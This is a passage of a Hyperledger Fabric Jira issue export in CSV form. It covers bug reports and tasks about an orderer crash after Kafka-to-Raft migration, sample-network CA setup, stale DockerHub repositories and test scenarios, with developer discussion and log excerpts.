Error: failed to retrieve broadcast client: failed to load config for OrdererClient: unable to load orderer.tls.rootcert.file: open */opt/gopath/src/github.cm/hyperledger/fabric/peer/crypto/ordererOrganizations/ust-positive-network.com/orderers/orderer0.ust-positive-network.com/msp/tlscacerts/tlsca.ust-positive-network.com-cert.pem*: no such file or directory
Usage:
 peer lifecycle chaincode approveformyorg [flags]

 

Best regards;;;","10/Feb/20 10:46 PM;raulhsj;Any updates on this? Thanks;;;","11/Feb/20 3:58 AM;btl5037;How did you deploy the network? Is it docker-compose, k8s, or are you running the raw binaries? Nowhere in any of our codebases is the `github.cm` value set. So presumably the working_dir was set somewhere else, which is the value we are seeing propogated here.;;;","11/Feb/20 4:45 PM;raulhsj;Hi Brett,

As you said, something slipped, specifically, the problem is the path which I passed to *--caflag*, which is wrong. I am deeply sorry for having you wasting your time in something that I could be taken care of if done more carefully. Please, close the bug and my apollogies again.

Best regards

    ;;;","11/Feb/20 11:20 PM;btl5037;No problem at all. Just glad we found the problem. We're happy to help;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Fabcar to use release v1.0.0 of contract API Go,FAB-17477,44274,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,awjh-ibm,awjh-ibm,awjh-ibm,06/Feb/20 10:38 PM,07/Feb/20 7:49 PM,28/Oct/23 3:09 AM,07/Feb/20 7:49 PM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018wr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update commercial paper to use Go v1.0.0,FAB-17478,44275,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,awjh-ibm,awjh-ibm,06/Feb/20 10:38 PM,07/Feb/20 8:01 PM,28/Oct/23 3:09 AM,07/Feb/20 8:01 PM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018wz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer Crash if orderer not added to consenter block for all channels.,FAB-17479,44278,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,ptippett,ptippett,07/Feb/20 4:00 AM,13/Feb/20 6:19 PM,28/Oct/23 3:09 AM,13/Feb/20 6:19 PM,v1.4.3,,,,,,,,,v1.4.5,v2.0.1,v2.1.0,,fabric-orderer,,,,,,,,,0,,,,,,"To Reproduce:
 * Start with a blockchain environment with a system channel and 1 or more application channels that are using Kafka consensus.
 * Convert the environment to RAFT consensus and turn off kafka/zookeeper containers.
 * Add a new orderer to the Orderer cluster.
 * However, only add that orderer to the consenter set of the system channel and some of the application channels.
 * The orderer will synch data for the channels where it is a member of the consenter set.
 * In the logs (see below) you'll see it start raft based consensus but it will also try to start kafka based consensus for the channel it is not a member of.
 * Note that in our case, the kafka brokers were left in the kafka broker list in the channel info, but consensus type is etcdraft.

Here's the error we saw:

```[36m2020-01-24 13:22:00.827 UTC [orderer.consensus.kafka] try -> DEBU 7e6[0m [channel: go] Need to retry because process failed = error creating topic [go]; failed to retrieve metadata for the cluster
 [36m2020-01-24 13:22:05.356 UTC [orderer.common.server] replicateDisabledChains -> DEBU 7e7[0m No inactive chains to try to replicate
 [36m2020-01-24 13:22:05.651 UTC [orderer.consensus.kafka] try -> DEBU 7e8[0m [channel: go] Creating Kafka topic [go] for channel [go/0]
 [36m2020-01-24 13:22:05.652 UTC [orderer.consensus.kafka.sarama] Open -> DEBU 7e9[0m ClientID is the default of 'sarama', you should consider setting it to something application-specific.
 [36m2020-01-24 13:22:05.687 UTC [orderer.consensus.kafka.sarama] withRecover -> DEBU 7ea[0m Failed to connect to broker ash-zbc15a.4.secure.blockchain.ibm.com:10900: dial tcp 169.47.130.222:10900: connect: connection refused
 [36m2020-01-24 13:22:05.687 UTC [orderer.consensus.kafka.sarama] Open -> DEBU 7eb[0m ClientID is the default of 'sarama', you should consider setting it to something application-specific.
 [36m2020-01-24 13:22:05.722 UTC [orderer.consensus.kafka.sarama] withRecover -> DEBU 7ec[0m Failed to connect to broker ash-zbc15b.4.secure.blockchain.ibm.com:10900: dial tcp 169.47.135.215:10900: connect: connection refused
 [36m2020-01-24 13:22:05.722 UTC [orderer.consensus.kafka.sarama] Open -> DEBU 7ed[0m ClientID is the default of 'sarama', you should consider setting it to something application-specific.
 [36m2020-01-24 13:22:05.760 UTC [orderer.consensus.kafka.sarama] withRecover -> DEBU 7ee[0m Failed to connect to broker ash-zbc15c.4.secure.blockchain.ibm.com:10900: dial tcp 169.47.135.219:10900: connect: connection refused
 [36m2020-01-24 13:22:05.761 UTC [orderer.consensus.kafka.sarama] Open -> DEBU 7ef[0m ClientID is the default of 'sarama', you should consider setting it to something application-specific.
 [36m2020-01-24 13:22:05.797 UTC [orderer.consensus.kafka.sarama] withRecover -> DEBU 7f0[0m Failed to connect to broker ash-zbc15d.4.secure.blockchain.ibm.com:10900: dial tcp 169.47.135.217:10900: connect: connection refused
 [36m2020-01-24 13:22:05.797 UTC [orderer.consensus.kafka.sarama] Open -> DEBU 7f1[0m ClientID is the default of 'sarama', you should consider setting it to something application-specific.
 [36m2020-01-24 13:22:05.830 UTC [orderer.consensus.kafka.sarama] withRecover -> DEBU 7f2[0m Failed to connect to broker ash-zbc15e.4.secure.blockchain.ibm.com:10900: dial tcp 169.47.135.218:10900: connect: connection refused
 [36m2020-01-24 13:22:05.830 UTC [orderer.consensus.kafka] try -> DEBU 7f3[0m [channel: go] Need to retry because process failed = error creating topic [go]; failed to retrieve metadata for the cluster
 panic: runtime error: invalid memory address or nil pointer dereference

[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x1101470]```",,baohua,denyeart,ptippett,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Feb/20 6:38 AM;ptippett;logs-from-orderer-in-n5a4252orderer1-6b4cdff895-7tmzg(1).txt;https://jira.hyperledger.org/secure/attachment/18128/logs-from-orderer-in-n5a4252orderer1-6b4cdff895-7tmzg%281%29.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018xf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,denyeart,ptippett,yacovm,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Feb/20 6:27 AM;yacovm;[~ptippett] can you attach the logs and not just a snippet? 
Are you sure you migrated *all* the channels to etcdraft ? ;;;","07/Feb/20 6:35 AM;ptippett;[~yacovm] Yep.  The original orderers (3 of them) were running fine and every channel was set to RAFT consensus.  Also after RAFT migration we turn off kafka/zookeeper, so they would have been failing/throwing errors if not all channels were raft.

 

 ;;;","07/Feb/20 7:21 AM;yacovm;i reproduced this locally in an integration test... I think this happens because when orderers onboard a cluster, they always commit the genesis block, even if they do not participate in that channel. This is done to be able to track this channel in the future, when they will be added to it.
However, the genesis block is a Kafka one... ;;;","07/Feb/20 7:40 AM;ptippett;[~yacovm] Nice.  Thanks for investigating.  I don't have any earlier logs.  Likely you don't need them since you reproduced.

The other thing I forgot to mention is that this channel in particular did not have any peers or blocks other than the genesis block. The lack of peers is actually why it didn't get added to the list of channels that we added the new orderer node to because the code that pulls the channel list was relying on the peers to find the channels.  I don't think this matters in this issue, but figured I'd mention it.;;;","07/Feb/20 8:24 AM;yacovm;I am not sure I was clear: There is a bigger problem here.
If you take a migrated kafka cluster and try to add more orderers to it later on, it won't work... the nodes will say: ""hey I'm not part of this channel"" when they onboard, so they will never replicate the block that migrated the channels,  and later on they will try to start a Kafka chain and will never try to check if they are added later on, even if they won't crash.

Playing my own advocate - Raft onboarding was implemented before migration so we could never test this scenario back in the day, however, it is a real shame that no one tested this until now... I'm actually done in writing a fix that solves both your crash and the replication problem later on. 

Will post a PR shortly after I'll finish up the integration test.;;;","07/Feb/20 8:44 AM;yacovm;https://github.com/hyperledger/fabric/pull/642 - for release-1.4 (v1.4.5);;;","07/Feb/20 11:50 AM;ptippett;[~yacovm] Thanks for the fix. If it helps, I can confirm that using the current code, I can migrate channels from kafka to Raft based consensus and, assuming I add individual ordering nodes to the consenter set for every channel, things work fine.

If I replay what you wrote above, I think what you are saying is if you only fixed the orderer crash in this bug, I still could never add that orderer node to the ""missing"" raft channel once it first comes up as kafka.  So once we get in this state, we're stuck.  Yep, that's bad.;;;","07/Feb/20 11:28 PM;denyeart;Thanks [~yacovm].

I assume a cherry pick to release-2.0 for v2.0.1 and master would make sense. Updated FixVersion accordingly.;;;","08/Feb/20 2:53 AM;yacovm;[https://github.com/hyperledger/fabric/pull/644] - for master.

[https://github.com/hyperledger/fabric/pull/645] - for v2.0

[~denyeart] , [~ptippett] keep in mind that we probably have a similar problem when migrating from Solo to Raft.

I'll leave it as an optional home exercise for now ;) , if anyone wants to have a go at it, he/she is welcome.;;;","11/Feb/20 4:59 AM;denyeart;[~jyellick] or [~guoger] - Could you review the release-1.4 PR first so that we can get it into v1.4.5?   https://github.com/hyperledger/fabric/pull/642 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DockerHub repos have not been updated for three years. Consider deleting.,FAB-17480,44284,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,ryjones,ryjones,07/Feb/20 8:10 AM,19/Apr/20 12:59 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"https://hub.docker.com/repository/docker/hyperledger/fabric-starter-kit/tags?page=1
https://hub.docker.com/repository/docker/hyperledger/fabric-sdk-py/tags?page=1
https://hub.docker.com/repository/docker/hyperledger/fabric-membersrvc/tags?page=1
",,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018yr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DockerHub repo has not been updated for two years. Consider deleting or updating.,FAB-17481,44285,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,ryjones,ryjones,07/Feb/20 8:11 AM,19/Apr/20 12:59 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"https://hub.docker.com/repository/docker/hyperledger/fabric-peer-evm/tags?page=1
",,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018yz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DockerHub repos have not been updated in the last year. Consider updating.,FAB-17482,44286,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,ryjones,ryjones,07/Feb/20 8:12 AM,19/Apr/20 12:59 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"https://hub.docker.com/repository/docker/hyperledger/fabric-ca-tools/tags?page=1
https://hub.docker.com/repository/docker/hyperledger/fabric-ca-orderer/tags?page=1
https://hub.docker.com/repository/docker/hyperledger/fabric-ca-peer/tags?page=1
https://hub.docker.com/repository/docker/hyperledger/fabric-basejvm/tags?page=1

",,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018z7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
first-network sample - org3 is missing its fabric-ca-server across board...,FAB-17483,44302,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,pvrbharg,pvrbharg,09/Feb/20 12:19 PM,13/Feb/20 8:45 AM,28/Oct/23 3:09 AM,10/Feb/20 10:59 PM,v1.4.4,v2.0.0,,,,,,,,v1.4.4,v2.0.0,,,fabric-samples,,,,,,,,,0,,,,,,"first-network sample in 1.4.4 and 2.0.0 code streams - missing across the board - org3 CA.

I am not sure if this is intended or oversight [in either case we need to document as to why and  also may need to fix sample code].

Thanks.

",,denyeart,negupta,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Feb/20 3:28 AM;pvrbharg;fabric-ca-server-bringup-log-ORG2.txt;https://jira.hyperledger.org/secure/attachment/18131/fabric-ca-server-bringup-log-ORG2.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0190z:",,,,Unset,Unset,,"Just review the code and also the sample scripts - you would understand [documentation and repository]:

You need to review and make changes in the following URLs and sample code or both:

https://github.com/hyperledger/fabric-samples/tree/release-1.4/first-network
https://github.com/hyperledger/fabric-samples/tree/master/first-network

https://github.com/hyperledger/fabric-samples/blob/master/first-network/docker-compose-couch-org3.yaml


https://github.com/hyperledger/fabric-samples/blob/master/first-network/docker-compose-ca.yaml

byfn.sh

export BYFN_CA1_PRIVATE_KEY=$(cd crypto-config/peerOrganizations/org1.example.com/ca && ls *_sk)
export BYFN_CA2_PRIVATE_KEY=$(cd crypto-config/peerOrganizations/org2.example.com/ca && ls *_sk)

eyfn.sh

 # start org3 peers
  if [ ""${IF_COUCHDB}"" == ""couchdb"" ]; then
      IMAGE_TAG=${IMAGETAG} docker-compose -f $COMPOSE_FILE_ORG3 -f $COMPOSE_FILE_COUCH_ORG3 up -d 2>&1
  else
      IMAGE_TAG=$IMAGETAG docker-compose -f $COMPOSE_FILE_ORG3 up -d 2>&1
  fi

Thanks.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,negupta,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Feb/20 10:59 PM;denyeart;First network is being sunset in favor of the new test network in v2.0. If there are improvements required, let's add them to test network instead of first network.

https://hyperledger-fabric.readthedocs.io/en/release-2.0/test_network.html

https://github.com/hyperledger/fabric-samples/tree/master/test-network/addOrg3

[~negupta] Can answer other questions about test network.

I'm marking this as Won't Do, but if you'd like to extend first network in release-1.4, feel free to re-open.;;;","10/Feb/20 11:46 PM;negupta;The test network supports Using the Fabric CA server to generate the certificates for all organizations, including org3. Unlike the first network, which uses cryptogen to create the certificates and keys, and then bootstrap a fabric CA with a key and cert, the test network initializes the fabric ca server and then uses it to generate the crypto material.

https://github.com/hyperledger/fabric-samples/tree/master/test-network/organizations/fabric-ca;;;","11/Feb/20 11:27 AM;pvrbharg;Dear David and Nikhil,

Outstanding response and I need to get the V2.0.0 code base and run thru'.
A vast number of our customers are using really code base that is pre-v2.0.0. - per my read and own experience - from pre-v1.0.0 alpha [sad I know] to various release levels - all the way up to v1.4.3 [not yet v1.4.4 since we have not published v1.4.4 IBP images yet].
So I would mull over on the re-open comment.

As I check out shortly - if you know the answer from your top of head - you can respond [optional and I would review the code and run the network myself]:
* Do we know if the certificates provisioned by fabric-ca-server are self-signed or root/intermediate signed?
* Do we know if the certificates provisioned by fabric-ca-server are a separate set each - for application identities versus TLS endpoint certificates? including the 
  provisioning corresponding intermediate CAs [separated for application identities provisioning versus TLS cerificates provisioning?]

My above thoughts are based on what we guide in read-only documentation as best/recommended practices.

Hopefully I am clear here in my ask - if not we can connect out-of-band per your response. 

Thanks.;;;","13/Feb/20 4:09 AM;pvrbharg;Dear David and Nikhil,

 

Per my read of running fabric-ca-server log for Org2 - in a docker container for test-network as attached below:

[^fabric-ca-server-bringup-log-ORG2.txt]

^The server is an intermediate server backed by a root and we are running only one set of servers per each ORG - provisioning both Application and TLS PKI [for application signing by actors and for client-server communication of peer-orderer using TLS.^

^Please confirm my understanding.^

^This is not per our recommended best practice here [especially in the context of Fabric-ca-server, given it is supported for operational deployments and unlike cryptogen [unsupported in production topology]:^

^[https://hyperledger-fabric.readthedocs.io/en/release-1.4/msp.html]^

^[https://hyperledger-fabric.readthedocs.io/en/release-2.0/msp.html#membership-service-providers-msp]^

*6) CAs and TLS CAs*

MSP identities’ root CAs and MSP TLS certificates’ root CAs (and relative intermediate CAs) need to be declared in different folders. This is to avoid confusion between different classes of certificates. It is not forbidden to reuse the same CAs for both MSP identities and TLS certificates but best practices suggest to avoid this in production.

 

We can always say - the test-network sample is a sample and uses one set of CAs per Org - to show the concept. We might be better served if we state this explicitly in the documentation since our sample is doing what we tell to be a not recommended practice for operational deployments.

Please share your wisdom.

 

^Thanks.^;;;","13/Feb/20 4:33 AM;negupta;[~pvrbharg] The Test Network CAs are self signed. The create their own root, and are not intermediates of any any other CA, or use a private key or cert to bootstrap. Each CA has a TLS CA profile which is used to create the TLS certificates. The enrollment command creates a different folder structure for the TLS certificates created by the Fabric CA. 

Given that it is a test network, this setup seems fine to me and demostrates the concept of how to use CAs with Fabric (which many users do not use at all given how easy to use cryptogen is). The Fabric CA operations guide https://hyperledger-fabric-ca.readthedocs.io/en/latest/operations_guide.html is linked to by the tutorial, and uses different CAs for the MSP folder and for TLS. It uses self signed CAs that are not intermediates.;;;","13/Feb/20 4:50 AM;pvrbharg;[~negupta] - Thank you for your clarification and the following lines from the attached log files confused me to interpret the way I did:


2020/02/12 17:04:08 [INFO] Server Version: 1.4.4
2020/02/12 17:04:08 [INFO] Server Levels: &{{color:#0747a6}*Identity:2*{color} Affiliation:1 Certificate:1 Credential:1 RAInfo:1 Nonce:1}

2020/02/12 17:04:08 [DEBUG] {color:#0747a6}*Init CA with home /etc/hyperledger/fabric-ca-server and config \{Version:1.2.0 Cfg:{Identities:{PasswordAttempts:10 AllowRemove:false} Affiliations:\{AllowRemove:false}} CA:\{Name:ca-org2 Keyfile: Certfile:ca-cert.pem Chainfile:ca-chain.pem} Sign*{color}
{color:#0747a6}*ing:0xc000407570 CSR:\{CN:ca.org2.example.com Names:[{C:UK ST:Hampshire L:Hursley O:org2.example.com OU: SerialNumber:}] Hosts:[localhost org2.example.com] KeyRequest:0xc00000fc20 CA:0xc00000fca0 SerialNumber:} Registry:{MaxEnrollments:-1 Identities:[{ Name:**** Pass:*****{color}
{color:#0747a6} *Type:client Affiliation: MaxEnrollments:0 Attrs:map[hf.AffiliationMgr:1 hf.GenCRL:1 hf.IntermediateCA:1 hf.Registrar.Attributes:* hf.Registrar.DelegateRoles:* hf.Registrar.Roles:* hf.Revoker:1] }]} Affiliations:map[org1:[department1 department2] org2:[department1]] LDA*{color}
{color:#0747a6}*P:\{ Enabled:false URL:ldap://****:****@<host>:<port>/<base> UserFilter:(uid=%s) GroupFilter:(memberUid=%s) Attribute:{[uid member] [{ }] map[groups:[\{ }]]} TLS:\{false [] { }} } DB:\{ Type:sqlite3 Datasource:fabric-ca-server.db TLS:{false [] { }} } CSP:0xc0004143c0 Clien*{color}
{color:#0747a6}*t:<nil> Intermediate:\{ParentServer:{ URL: CAName: } TLS:\{Enabled:false CertFiles:[] Client:{KeyFile: CertFile:}} Enrollment:\{ Name: Secret:**** CAName: AttrReqs:[] Profile: Label: CSR:<nil> Type:x509 }} CRL:\{Expiry:24h0m0s} Idemix:{IssuerPublicKeyfile: IssuerSecretKeyf*{color}
{color:#0747a6}*ile: RevocationPublicKeyfile: RevocationPrivateKeyfile: RHPoolSize:100 NonceExpiration:15s NonceSweepInterval:15m}}*{color}

2020/02/12 17:04:08 [DEBUG] {color:#0747a6}*Root CA certificate request: \{CN:ca.org2.example.com Names:[{C:UK ST:Hampshire L:Hursley O:org2.example.com OU: SerialNumber:}] Hosts:[localhost org2.example.com] KeyRequest:0xc000414f60 CA:0xc00000fca0 SerialNumber:}*{color}
2020/02/12 17:04:08 [INFO] generating key: &\{A:ecdsa S:256}
2020/02/12 17:04:08 [DEBUG] generate key from request: algo=ecdsa, size=256
2020/02/12 17:04:08 [INFO] {color:#0747a6}*encoded CSR*{color}
2020/02/12 17:04:08 [DEBUG] validating configuration 
2020/02/12 17:04:08 [DEBUG] validate local profile
2020/02/12 17:04:08 [DEBUG] profile is valid
2020/02/12 17:04:08 [INFO] signed certificate with serial number 118106335947109942251728065692578049638921483662
2020/02/12 17:04:08 [INFO] *{color:#0747a6}The CA key and certificate were generated for CA ca-org2{color}*
2020/02/12 17:04:08 [INFO] The key was stored by BCCSP provider 'SW'
2020/02/12 17:04:08 [INFO] The certificate is at: /etc/hyperledger/fabric-ca-server/ca-cert.pem

 

Thanks and I would defer to your judgement - if further documentation is needed or not.

 

Thanks.;;;","13/Feb/20 8:45 AM;negupta;I think this says that the CA is allowed to create intermediates: hf.IntermediateCA:1 

As for the location, I included different locations for the different test network orgs, new york, durham nc, and hursley UK, in the configuration file of the Fabric-CA-Server file for the fun of it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve documentation of maintenance filter,FAB-17484,44303,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,09/Feb/20 10:51 PM,17/Feb/20 7:28 PM,28/Oct/23 3:09 AM,17/Feb/20 7:28 PM,,,,,,,,,,v2.1.0,,,,fabric-orderer,,,,,,,,,0,,,,,,Add function comments when needed.,,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01917:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Basic Scenario to Azure,FAB-17485,44305,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,10/Feb/20 12:40 PM,21/Feb/20 11:44 PM,28/Oct/23 3:09 AM,21/Feb/20 11:44 PM,,,,,,,,,,v1.4.4,v2.0.0,,,fabric-quality,,,,,,,,,0,azp-migrate,,,,,"Scenario should be basic to start with, this should run on a raw VM using Compose:
 * 1 RAFT orderer
 * 1 organization
 * 1 peer per org
 * 1 of 1 endorsement policy
 * 1 channel
 * Chaincodes
 ** samplecc
 ** map_private

We should send only a small transaction load initially to check for regression",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zs",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/g